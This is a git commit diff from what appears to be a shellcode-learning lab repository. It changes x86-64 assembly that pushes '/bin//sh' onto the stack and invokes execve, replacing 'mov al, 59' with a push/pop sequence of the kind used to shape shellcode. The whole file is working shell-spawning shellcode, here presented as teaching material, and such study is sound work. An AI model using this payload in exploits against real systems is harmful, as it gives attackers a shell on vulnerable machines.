9675920b2879ca2335a38e1614a6606a02502129
Ravindu Piyankara <78452012+Ravindu-Priyankara@users.noreply.github.com>
2025-12-27 20:40:35 +0530

    feat: Update lab03.1 stack based string construction assembly code

--- shellcode-labs/lab_03_Stack_tricks/lab_01_Stack-Based_String_Construction/assembly_code/lab01.asm
+++ shellcode-labs/lab_03_Stack_tricks/lab_01_Stack-Based_String_Construction/assembly_code/lab01.asm
@@ -5,11 +5,12 @@ _start:
 	xor esi, esi			    ; rsi = 0 (argv = NULL)
 	xor edx, edx			    ; rdx = 0 (envp = NULL)
 	
-	push rsi			        ; push 8 bytes of null (string terminator)
+	push rsi		            ; push 8 bytes of null (string terminator)
 
 	mov rbx, 0x68732f2f6e69622f	; Push "/bin//sh" in one go (Little-Endian)
 	push rbx			        ; push to the stack
 
-	mov al, 59			        ; execve syscall number
-	mov rdi, rsp			    ; RDI now points to exactly "/bin//sh\0"
-	syscall				        ; execve("path", argv[0], envp[]) 
+	push 0x3b			
+	pop rax				        ; execve syscall number
+	mov rdi, rsp		    	; RDI now points to exactly "/bin//sh\0"
+	syscall			        	; execve("path", argv[0], envp[])
